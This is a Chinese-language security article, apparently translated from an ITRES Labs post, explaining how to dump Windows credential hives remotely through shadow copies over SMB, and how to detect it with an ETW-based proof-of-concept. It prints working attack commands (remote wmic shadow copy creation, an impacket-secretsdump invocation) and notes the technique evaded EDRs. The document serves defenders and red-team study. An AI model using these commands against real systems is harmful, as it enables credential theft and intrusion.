> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzAxODM5ODQzNQ==&mid=2247488952&idx=1&sn=ec5e934481be8b9760d4cf6f099da8d7

#  远程 Windows 凭据转储与 Shadow Snapshots（卷影副本）漏洞利用与检测  
ITRES  securitainment   2025-06-27 15:03  
  
> REMOTE WINDOWS CREDENTIAL DUMP WITH SHADOW SNAPSHOTS EXPLOITATION AND DETECTION – Labs at ITRES  
  
> 免责声明：本博客文章仅用于教育和研究目的。提供的所有技术和代码示例旨在帮助防御者理解攻击手法并提高安全态势。请勿使用此信息访问或干扰您不拥有或没有明确测试权限的系统。未经授权的使用可能违反法律和道德准则。作者对因应用所讨论概念而导致的任何误用或损害不承担任何责任。  
  
## 引言（INTRODUCTION）  
  
本文旨在介绍一种利用 Shadow Snapshots（卷影副本）远程转储 Windows 本地凭据（SAM）的技术。通过 Shadow Snapshots，可以直接通过 SMB 协议访问所需的注册表 hive（SAM、SYSTEM、SECURITY），**无需在目标主机上执行任何代码**  
。  
  
从防御者视角，本文还阐述了如何检测此类活动。为演示检测方法，我们开发了一个 PoC（概念验证）工具，展示如何利用 Windows 事件跟踪（ETW, Event Tracing for Windows）发现恶意行为。  
  
该技术已集成进 Impacket  
 工具集的 secretsdump  
 模块，可通过参数 **—use-remoteSSMethod**  
 启用。  
  
通过 ETW，结合 WMI 和 SMB-SERVER provider，可以实现对该攻击行为的检测。我们构建了 PoC 以说明检测思路。检测此技术应为优先事项，因为它允许攻击者**远程**  
窃取 Windows 本地凭据，且**无需**  
在受害主机上**执行任何代码**  
。  
## 原理（The theory）  
  
首先需要明确，访问 Windows 本地凭据的一个“难点”在于，即使拥有最高权限，也无法直接在磁盘上访问所需的 hive 文件。这是因为这些 hive 已被 Windows 映射到注册表，系统内部正占用这些文件。  
  
因此，传统的 Windows 凭据转储工具通常依赖注册表导出。例如，使用
```
reg save
```

  
命令从注册表备份，或直接在注册表中访问 SAM。还有一些工具通过文件系统驱动（File System Drivers）直接访问磁盘上的 hive，比如 pwdump7  
（https://www.openwall.com/passwords/windows-pwdump）。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCPEja4wh9nnkjmk3s2OG2SHdF9HCAeNRMssMfLsZQvSWMWNwgVUnX6hWnVCxn9dqSfe3sAFbGwIKA/640?wx_fmt=png&from=appmsg "")  
  
磁盘上的这些 hive 文件以_REGF_格式存储，Windows 会解析并加载到 Registry  
（注册表）结构中。  
- https://github.com/libyal/libregf/blob/main/documentation/Windows%20NT%20Registry%20File%20(REGF)%20format.asciidoc  
  
- https://github.com/PeterGabaldon/WhatAboutSAM/blob/main/WhatAboutSAM/WhatAboutSAM/shadowMethod.cpp#L168  
  
那么，当创建 Shadow Snapshot（卷影副本）时会发生什么？  
  
创建 Shadow Snapshot 后，所有文件都可访问，包括磁盘上的注册表 hive（包含 Windows 凭据），因为这些文件此时不再被 Windows 占用，系统使用的是“实时”文件。需要注意，Shadow Snapshots 基于 CoW（Copy-On-Write，写时复制）机制，除非“实时”分区有变更，否则快照中的文件与原始文件一致。  
## 手动操作（Manual approach）  
  
简单测试方法如下：  
- 创建 Shadow Snapshot（卷影副本）  
  
- 
```
wmic shadowcopy call create Volume='C:\'
```

  
  
- 获取快照路径并列出  
  

```
vssadmin list shadows
[...]
Contents of shadow copy set ID: {5590bae6-9edc-4012-b58a-5ff54e937cae}
Contained 1 shadow copies at creation time: 03/06/2025 17:12:36
Shadow Copy ID: {6efd3825-90a8-465e-8205-f445f2775769}
Original Volume: (C:)\?\Volume{1d680c6d-69f7-4ad4-8177-b8240d0cf94c}\Shadow Copy Volume: \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
[...]
```

- 访问 Shadow Snapshot（卷影副本），并进入 Windows\System32\Config  
 目录。以往最简单的方法是用 7z（7-Zip），但在最新版本中已不可行。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCPEja4wh9nnkjmk3s2OG2SHic0ekV8YqSaoL9YKIo92tqU49gFictYzvX66vCQicxTfkEERHcucJPyHA/640?wx_fmt=png&from=appmsg "")  
  
Nirsoft  
 提供了一个名为 ShadowCopyView  
 的工具，也可以用于访问卷影副本。  
- https://www.nirsoft.net/utils/shadow_copy_view.html  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCPEja4wh9nnkjmk3s2OG2SHORIY2FAtsLF0ZfRxic9jPXpic1PjOrDZapuEASSH2NgOfYNw5J8ggzlg/640?wx_fmt=png&from=appmsg "")  
  
通过上述方式，可以直接访问并导出这些注册表 hive（如 SAM、SYSTEM、SECURITY），进而实现凭据转储（credential dump）。  
## SMB  
  
思路是：既然可以通过 Shadow Snapshots（卷影副本）在本地磁盘直接访问安全 hive 文件，是否也能通过 SMB 协议远程访问？答案是肯定的，并且这种方法早已被公开记录。  
- https://www.4n6k.com/2017/02/forensics-quickie-accessing-copying.html  
  
SMB 协议支持通过“GMT format  
”时间戳格式访问历史快照。利用该格式，可以远程通过 SMB 访问文件系统的历史版本。  
- https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb/bffc70f9-b16a-453b-939a-0b6d3c9263af  
  
摘自微软官方文档：  
> 例如，若要访问 \server\mydocs\reviews\feb01.doc 在 2001 年 3 月 30 日 14:44:00（UTC）的历史版本，路径格式如下：  
```
\\server\mydocs\reviews\@GMT-2001.03.30-14.44.00\feb01.doc
```

  
  
  
因此，利用 GMT format  
，可以远程访问 SAM  
、SYSTEM  
、SECURITY  
 等 hive 文件。  
  
Impacket 已实现了用于列举历史快照的 SMB 调用：FSCTL_SRV_ENUMERATE_SNAPSHOTS  
（https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb/5a43eb29-50c8-46b6-8319-e793a11f6226）  
- https://github.com/fortra/impacket/blob/master/impacket/smbconnection.py#L798  
  
## 手动示例（MANUAL EXAMPLE）  
  
以下为手动利用该技术的示例。  
  
首先，需要远程创建 Shadow Snapshot  
（卷影副本），可通过 wmic  
 命令实现。  

```
C:\Users\peter>wmic /node:192.168.24.153 /user:peter /password:[***] shadowcopy call create Volume='C:\'
Executing (Win32_ShadowCopy)->create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ReturnValue = 0;
        ShadowID = &#34;{037BE7D1-2915-422A-B961-13065D469BE7}&#34;;
};




C:\Users\peter>
```

  
在远程系统上，你会看到卷影副本（Shadow Snapshot）已被成功创建。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCPEja4wh9nnkjmk3s2OG2SH5rGKGTz4ZYhicYqnLJK065SYuXiaVluQayInsQkEicd5H8t6fVFByibt3Q/640?wx_fmt=png&from=appmsg "")  
  
此时，可以通过远程方式访问该卷影副本。以本例为例，快照创建时间为 2025 年 6 月 3 日 9:02:45 AM  
（UTC 时间为 16:02:45），因此远程访问路径应为 @GMT-2025.06.03-16.02.45。请注意，路径中的时间必须使用 UTC 格式。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCPEja4wh9nnkjmk3s2OG2SHlefVeTjzSWUaTvGLujhzdnnTRVicibzMicTKX1y8Xib3fuYSO8oFjI2wHw/640?wx_fmt=png&from=appmsg "")  
  
通过该路径，可以直接下载 SAM、SYSTEM 等注册表 hive 文件。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCPEja4wh9nnkjmk3s2OG2SHOUywU6axn7EoSwAMp2gZwicxj0RH2xc9woDibnkRIjgxRn5RNRNgiatvQ/640?wx_fmt=png&from=appmsg "")  
## 自动化（AUTOMATION）  
  
为实现自动化，Impacket  
 的 secretsdump  
 工具在 2024 年 5 月合并了新选项。  
- https://github.com/fortra/impacket/pull/1719  
  
本质上，Impacket 用 Python 实现了同样的流程：远程通过 WMI 创建 Shadow Snapshot（卷影副本），执行 create 方法，然后通过 SMB 下载 SAM/SYSTEM/SECURITY，最后再通过 WMI 删除该 Shadow Snapshot。  
  
使用方法很简单，只需在 secretsdump  
 命令中添加 **–use-remoteSSMethod**  
 参数。例如：  
- **impacket-secretsdump -use-remoteSSMethod “./Admin:1234@192.168.1.161”**  
  
远程卷（remote volume）可通过 **–remoteSS-remote-volume**  
 参数指定（默认为‘C:\’），本地保存 SAM/SYSTEM/SECURITY 的路径可通过 **–remoteSS-local-path**  
 指定（默认为当前目录‘.’）。  
  
自该功能合并进 secretsdump  
 以来，我们在攻防演练中多次使用，未被主流安全产品或顶级 EDR 检测到。  
  
建议你在自己的安全产品环境下测试，并反馈结果。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCPEja4wh9nnkjmk3s2OG2SH9LpQqs5FdJyNuuVIlBYFNar0LER9BAfqcRruTeNoWMKCicxuM886ISQ/640?wx_fmt=png&from=appmsg "")  
## 检测（DETECTION）  
  
那么，如何检测这种攻击行为？  
  
我们开发了一个 PoC 工具，利用 ETW（Event Tracing for Windows）来检测此类恶意行为。虽然也尝试过其他方式（如 Windows 事件日志），但最终选择了 ETW。  
- https://github.com/I3IT/Detect.Remote.ShadowSnapshot.Dump  
  
### 攻击行为指示器（IOA, Indicator of Attack）  
  
在开发防御工具前，需明确哪些行为属于该攻击的典型指示器。本场景下，以下操作可作为明确的攻击迹象：  
- 通过 WMI（Win32_ShadowCopy::Create 方法）创建 Shadow Snapshot  
  
- 随后通过 SMB 远程读取 SAM/SYSTEM/SECURITY  
  
- Shadow Snapshot 被删除（可选指示器，前两项已足够）  
  
要获取相关日志，可使用以下 ETW provider：  
- Microsoft-Windows-WMI-Activity {1418EF04-B0B4-4623-BF7E-D74AB47BBDAA}  
  
- Microsoft-Windows-SMBServer {D48CE617-33A2-4BC3-A5C7-11AA4F29619E}  
  
这两个 ETW provider 提供了检测上述攻击行为所需的全部信息。  
  
关键在于解析这两个 provider 的事件流，准确识别上述操作链。  

```
if (wcscmp(propertyName, L&#34;Operation&#34;) == 0 && wcscmp(value, L&#34;Start IWbemServices::ExecMethod - root\\cimv2 : Win32_ShadowCopy::Create&#34;) == 0) {
                std::wcout << &#34;WARNING!!! POSSIBLE REMOTE DUMP USING SHADOW SNAPSHOT. A SHADOW SNAPSHOT HAS BEEN CREATED VIA WMI&#34; << std::endl;
                possible_dumping_detected = true;
            }


            if (wcscmp(propertyName, L&#34;FileName&#34;) == 0 && (wcscmp(value, L&#34;System32\\config\\SAM&#34;) == 0 || wcscmp(value, L&#34;System32\\config\\SYSTEM&#34;) == 0 || wcscmp(value, L&#34;System32\\config\\SECURITY&#34;) == 0) && possible_dumping_detected) {
                std::wcout << &#34;CRITICAL WARNING!!! REMOTE DUMP USING SHADOW SNAPSHOT IOA DETECTED. &#34; << value << &#34; DOWNLOADED REMOTELY VIA SMB&#34; << std::endl;
                dumping_detected = true;
            }


            if (wcscmp(propertyName, L&#34;Operation&#34;) == 0 && wcsstr(value, L&#34;Start IWbemServices::DeleteInstance - root\\cimv2 : Win32_ShadowCopy.ID=&#34;) != nullptr && dumping_detected) {
                std::wcout << &#34;CRITICAL WARNING!!! REMOTE DUMP USING SHADOW SNAPSHOT IOA DETECTED. THE SHADOW SNAPSHOT HAS BEEN DELETED&#34; << std::endl;
                dumping_detected = false;
            }
```

  
完整源代码可查阅：https://github.com/I3IT/Detect.Remote.ShadowSnapshot.Dump/blob/main/Detect.Remote.ShadowSnapshot.Dump/Main.cpp  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/hoiaQy7WhTCPEja4wh9nnkjmk3s2OG2SHt3pOUhI7o2d0TGgDEZfpZSlqB9mn5YYcOlmWHYS6BOf7pTrOeXXhNA/640?wx_fmt=gif&from=appmsg "")  
  
现在，当利用上述方法进行攻击时，该工具能够检测到前述攻击行为指示器（Indicator of Attack, IOA），并及时发出告警。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCPEja4wh9nnkjmk3s2OG2SH9LpQqs5FdJyNuuVIlBYFNar0LER9BAfqcRruTeNoWMKCicxuM886ISQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCPEja4wh9nnkjmk3s2OG2SHQtQM86EHkC8zYfibPe8HPYk9XOmwOb6rDS6Dib3Yo5kia01ibkseEMt27A/640?wx_fmt=png&from=appmsg "")  
  
下方展示了部分捕获并解析后的典型事件样例。  

```
WMI Method Invoked Event Captured! Event ID: 11
Provider ID: 337178372-45236-17955
Event Properties:
Property: CorrelationId Value: {00000000-0000-0000-0000-000000000000}
Property: GroupOperationId Value: 1492
Property: OperationId Value: 1495
Property: Operation Value: Start IWbemServices::ExecMethod - root\cimv2 : Win32_ShadowCopy::Create
Property: ClientMachine Value: Local
Property: ClientMachineFQDN Value:
Property: User Value: DESKTOP-81G2RNN\peter
Property: ClientProcessId Value: 2640
Property: ClientProcessCreationTime Value: 0
Property: NamespaceName Value: \\.\root\cimv2
Property: IsLocal Value: 1






WMI Method Invoked Event Captured! Event ID: 11
Provider ID: 337178372-45236-17955
Event Properties:
Property: CorrelationId Value: {00000000-0000-0000-0000-000000000000}
Property: GroupOperationId Value: 1500
Property: OperationId Value: 1501
Property: Operation Value: Start IWbemServices::DeleteInstance - root\cimv2 : Win32_ShadowCopy.ID=&#34;{745EBABB-2D5F-486D-89A3-FC1BCCB93121}&#34;
Property: ClientMachine Value: Local
Property: ClientMachineFQDN Value:
Property: User Value: DESKTOP-81G2RNN\peter
Property: ClientProcessId Value: 2640
Property: ClientProcessCreationTime Value: 0
Property: NamespaceName Value: \\.\root\cimv2
Property: IsLocal Value: 1




SMB SERVER Provider Event Captured! Event ID: 8
Event Properties:
Property: SessionId Value: 2c000000001d
Property: ProcessId Value: 0
Property: TreeId Value: 1
Property: MessageId Value: 9
Property: MasterMessageId Value: ffffffffffffffff
Property: Command Value: [Unsupported Type]
Property: CreditsRequested Value: [Unsupported Type]
Property: Flags Value: 0
Property: SecurityFlags Value: [Unsupported Type]
Property: RequestedOplockLevel Value: [Unsupported Type]
Property: ImpersonationLevel Value: 2
Property: CreateFlags Value: 0
Property: RootDirectoryFid Value: 0
Property: DesiredAccess Value: 1
Property: FileAttributes Value: 0
Property: ShareAccess Value: 1
Property: CreateDisposition Value: 1
Property: CreateOptions Value: 40
Property: NameLength Value: [Unsupported Type]
Property: FileName Value: System32\config\SAM
Property: CreateContextsCount Value: 1
Property: LeaseKey Value: {0-0-0-00-000000}
Property: LeaseLevel Value: 0
Property: ConnectionGUID Value: {a33e9acb-584e-0-144e-3fa34e58db1}
Property: SessionGUID Value: {a33e9acb-584e-0-184e-3fa34e58db1}
Property: TreeConnectGUID Value: {a33e9acb-584e-1-7c4e-3fa34e58db1}
```

## 结论（Conclusion）  
  
在过去一年半的攻防演练中，我们频繁使用了该技术手段。强烈建议大家在自身的安全产品上进行测试，并欢迎分享检测与防护效果。  
## 参考资料（References）  
- https://github.com/I3IT/Detect.Remote.ShadowSnapshot.Dump  
  
- https://github.com/fortra/impacket/pull/1719  
  
- https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb/5a43eb29-50c8-46b6-8319-e793a11f6226  
  
- https://github.com/fortra/impacket/blob/master/impacket/smbconnection.py#L798  
  
- https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb/bffc70f9-b16a-453b-939a-0b6d3c9263af  
  
- https://www.4n6k.com/2017/02/forensics-quickie-accessing-copying.html  
  
- https://www.nirsoft.net/utils/shadow_copy_view.html  
  
- https://github.com/libyal/libregf/blob/main/documentation/Windows%20NT%20Registry%20File%20(REGF)%20format.asciidoc  
  
- https://github.com/PeterGabaldon/WhatAboutSAM/blob/main/WhatAboutSAM/WhatAboutSAM/shadowMethod.cpp#L168  
  
  
  
